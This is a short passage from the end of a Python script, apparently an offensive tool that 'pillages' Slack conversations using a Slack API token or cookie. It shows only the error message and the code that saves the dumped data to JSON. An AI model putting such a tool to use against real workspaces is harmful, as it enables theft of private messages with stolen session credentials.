        if output_data is None:
            print("[ERROR]: Unable to pillage conversations. Invalid Slack API token or cookie.")
            return

        if args.output_json:
            save_output_to_json(output_data, args.output_json)
        else:
            print(json.dumps(output_data, indent=2))

if __name__ == "__main__":
    main()
